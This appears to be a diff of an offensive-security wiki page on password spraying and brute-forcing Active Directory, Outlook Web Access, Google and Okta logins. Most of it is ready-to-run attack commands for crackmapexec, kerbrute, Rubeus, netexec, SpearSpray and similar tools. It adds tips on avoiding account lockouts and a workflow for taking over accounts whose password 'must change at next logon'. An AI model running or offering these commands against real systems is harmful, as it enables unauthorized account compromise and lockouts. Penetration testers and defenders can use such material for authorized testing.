@@ -1,13 +1,11 @@
 # Password Spraying / Brute Force
 
-
-
 ## **Password Spraying**
 
 Once you have found several **valid usernames** you can try the most **common passwords** (keep in mind the password policy of the environment) with each of the discovered users.\
 By **default** the **minimum** **password** **length** is **7**.
 
-Lists of common usernames could also be useful: [[https://github.com/insidetrust/statistically-likely-usernames|https://github.com/insidetrust/statistically-likely-usernames]]
+Lists of common usernames could also be useful: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)
 
 Notice that you **could lockout some accounts if you try several wrong passwords** (by default more than 10).
 
@@ -31,7 +29,7 @@ net accounts
 
 (Get-DomainPolicy)."SystemAccess" #From powerview
 ```
-```
+
 ### Exploitation from Linux (or all)
 
 - Using **crackmapexec:**
@@ -42,8 +40,8 @@ crackmapexec smb <IP> -u users.txt -p passwords.txt
 ## --local-auth flag indicate to only try 1 time per machine
 crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
 ```
-```
-- Using [[https://github.com/ropnop/kerbrute) (Go|**kerbrute**]]
+
+- Using [**kerbrute**](https://github.com/ropnop/kerbrute) (Go)
 
 ```bash
 # Password Spraying
@@ -51,23 +49,23 @@ crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9c
 # Brute-Force
 ./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com [--dc 10.10.10.10] passwords.lst thoffman
 ```
-```
-- [[https://github.com/Greenwolf/Spray) _**(you can indicate number of attempts to avoid lockouts|**spray**]]:**_
+
+- [**spray**](https://github.com/Greenwolf/Spray) _**(you can indicate number of attempts to avoid lockouts):**_
 
 ```bash
 spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
 ```
-```
-- Using [[https://github.com/TarlogicSecurity/kerbrute) (python|**kerbrute**]] - NOT RECOMMENDED SOMETIMES DOESN'T WORK
+
+- Using [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) (python) - NOT RECOMMENDED SOMETIMES DOESN'T WORK
 
 ```bash
 python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
 python kerbrute.py -domain jurassic.park -users users.txt -password Password123 -outputfile jurassic_passwords.txt
 ```
-```
+
 - With the `scanner/smb/smb_login` module of **Metasploit**:
 
-![[<../../images/image (745).png>|]]
+![[../../images/image (745).png]]
 
 - Using **rpcclient**:
 
@@ -77,10 +75,10 @@ for u in $(cat users.txt); do
     rpcclient -U "$u%Welcome1" -c "getusername;quit" 10.10.10.10 | grep Authority;
 done
 ```
-```
+
 #### From Windows
 
-- With [[https://github.com/Zer1t0/Rubeus|Rubeus]] version with brute module:
+- With [Rubeus](https://github.com/Zer1t0/Rubeus) version with brute module:
 
 ```bash
 # with a list of users
@@ -89,19 +87,19 @@ done
 # check passwords for all users in current domain
 .\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
 ```
-```
-- With [[https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) (It can generate users from the domain by default and it will get the password policy from the domain and limit tries according to it|**Invoke-DomainPasswordSpray**]]:
+
+- With [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) (It can generate users from the domain by default and it will get the password policy from the domain and limit tries according to it):
 
 ```bash
 Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
 ```
-```
-- With [[https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1|**Invoke-SprayEmptyPassword.ps1**]]
+
+- With [**Invoke-SprayEmptyPassword.ps1**](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1)
 
 ```
 Invoke-SprayEmptyPassword
 ```
-```
+
 ### Identify and Take Over "Password must change at next logon" Accounts (SAMR)
 
 A low-noise technique is to spray a benign/empty password and catch accounts returning STATUS_PASSWORD_MUST_CHANGE, which indicates the password was forcibly expired and can be changed without knowing the old one.
@@ -115,14 +113,14 @@ Workflow:
 # NetExec (null/guest) + RID brute to harvest users
 netexec smb <dc_fqdn> -u '' -p '' --rid-brute | awk -F'\\\\| ' '/SidTypeUser/ {print $3}' > users.txt
 ```
-```
+
 - Spray an empty password and keep going on hits to capture accounts that must change at next logon:
 
 ```bash
 # Will show valid, lockout, and STATUS_PASSWORD_MUST_CHANGE among results
 netexec smb <DC.FQDN> -u users.txt -p '' --continue-on-success
 ```
-```
+
 - For each hit, change the password over SAMR with NetExec’s module (no old password needed when "must change" is set):
 
 ```bash
@@ -133,7 +131,7 @@ netexec smb <DC.FQDN> -u <User> -p '' -M change-password -o NEWPASS="$NEWPASS"
 # Validate and retrieve domain password policy with the new creds
 netexec smb <DC.FQDN> -u <User> -p "$NEWPASS" --pass-pol
 ```
-```
+
 Operational notes:
 - Ensure your host clock is in sync with the DC before Kerberos-based operations: `sudo ntpdate <dc_fqdn>`.
 - A [+] without (Pwn3d!) in some modules (e.g., RDP/WinRM) means the creds are valid but the account lacks interactive logon rights.
@@ -143,7 +141,7 @@ Operational notes:
 ```bash
 legba kerberos --target 127.0.0.1 --username admin --password wordlists/passwords.txt --kerberos-realm example.org
 ```
-```
+
 ### Kerberos pre-auth spraying with LDAP targeting and PSO-aware throttling (SpearSpray)
 
 Kerberos pre-auth–based spraying reduces noise vs SMB/NTLM/LDAP bind attempts and aligns better with AD lockout policies. SpearSpray couples LDAP-driven targeting, a pattern engine, and policy awareness (domain policy + PSOs + badPwdCount buffer) to spray precisely and safely. It can also tag compromised principals in Neo4j for BloodHound pathing.
@@ -168,7 +166,7 @@ spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local
 # LDAPS (TCP/636)
 spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local --ssl
 ```
-```
+
 Targeting and pattern control:
 
 ```bash
@@ -179,7 +177,7 @@ spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local
 # Use separators/suffixes and an org token consumed by patterns via {separator}/{suffix}/{extra}
 spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -sep @-_ -suf !? -x ACME
 ```
-```
+
 Stealth and safety controls:
 
 ```bash
@@ -189,13 +187,13 @@ spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local
 # Leave N attempts in reserve before lockout (default threshold: 2)
 spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -thr 2
 ```
-```
+
 Neo4j/BloodHound enrichment:
 
 ```bash
 spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -nu neo4j -np bloodhound --uri bolt://localhost:7687
 ```
-```
+
 Pattern system overview (patterns.txt):
 
 ```text
@@ -206,7 +204,7 @@ Pattern system overview (patterns.txt):
 {samaccountname}
 {extra}{separator}{year}{suffix}
 ```
-```
+
 Available variables include:
 - {name}, {samaccountname}
 - Temporal from each user’s pwdLastSet (or whenCreated): {year}, {short_year}, {month_number}, {month_en}, {season_en}
@@ -223,11 +221,11 @@ Operational notes:
 
 There are multiples tools for p**assword spraying outlook**.
 
-- With [[https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_login/|MSF Owa_login]]
-- with [[https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_ews_login/|MSF Owa_ews_login]]
-- With [[https://github.com/sensepost/ruler) (reliable!|Ruler]]
-- With [[https://github.com/dafthack/DomainPasswordSpray) (Powershell|DomainPasswordSpray]]
-- With [[https://github.com/dafthack/MailSniper) (Powershell|MailSniper]]
+- With [MSF Owa_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_login/)
+- with [MSF Owa_ews_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_ews_login/)
+- With [Ruler](https://github.com/sensepost/ruler) (reliable!)
+- With [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) (Powershell)
+- With [MailSniper](https://github.com/dafthack/MailSniper) (Powershell)
 
 To use any of these tools, you need a user list and a password / a small list of passwords to spray.
 
@@ -239,27 +237,27 @@ To use any of these tools, you need a user list and a password / a small list of
     [x] Failed: c.cube:Summer2020
     [+] Success: s.svensson:Summer2020
 ```
-```
+
 ## Google
 
-- [[https://github.com/ustayready/CredKing/blob/master/credking.py|https://github.com/ustayready/CredKing/blob/master/credking.py]]
+- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)
 
 ## Okta
 
-- [[https://github.com/ustayready/CredKing/blob/master/credking.py|https://github.com/ustayready/CredKing/blob/master/credking.py]]
-- [[https://github.com/Rhynorater/Okta-Password-Sprayer|https://github.com/Rhynorater/Okta-Password-Sprayer]]
-- [[https://github.com/knavesec/CredMaster|https://github.com/knavesec/CredMaster]]
+- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)
+- [https://github.com/Rhynorater/Okta-Password-Sprayer](https://github.com/Rhynorater/Okta-Password-Sprayer)
+- [https://github.com/knavesec/CredMaster](https://github.com/knavesec/CredMaster)
 
 ## References
 
-- [[https://github.com/sikumy/spearspray|https://github.com/sikumy/spearspray]]
-- [[https://github.com/TarlogicSecurity/kerbrute|https://github.com/TarlogicSecurity/kerbrute]]
-- [[https://github.com/Greenwolf/Spray|https://github.com/Greenwolf/Spray]]
-- [[https://github.com/Hackndo/sprayhound|https://github.com/Hackndo/sprayhound]]
-- [[https://github.com/login-securite/conpass|https://github.com/login-securite/conpass]]
-- [[https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying|https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying]]
-- [[https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell|https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell]]
-- [[https://www.blackhillsinfosec.com/?p=5296|www.blackhillsinfosec.com/?p=5296]]
-- [[https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying|https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying]]
-- [[https://0xdf.gitlab.io/2025/08/28/htb-sendai.html|HTB Sendai – 0xdf: from spray to gMSA to DA/SYSTEM]]
+- [https://github.com/sikumy/spearspray](https://github.com/sikumy/spearspray)
+- [https://github.com/TarlogicSecurity/kerbrute](https://github.com/TarlogicSecurity/kerbrute)
+- [https://github.com/Greenwolf/Spray](https://github.com/Greenwolf/Spray)
+- [https://github.com/Hackndo/sprayhound](https://github.com/Hackndo/sprayhound)
+- [https://github.com/login-securite/conpass](https://github.com/login-securite/conpass)
+- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying)
+- [https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell](https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell)
+- [www.blackhillsinfosec.com/?p=5296](https://www.blackhillsinfosec.com/?p=5296)
+- [https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying](https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying)
+- [HTB Sendai – 0xdf: from spray to gMSA to DA/SYSTEM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
 
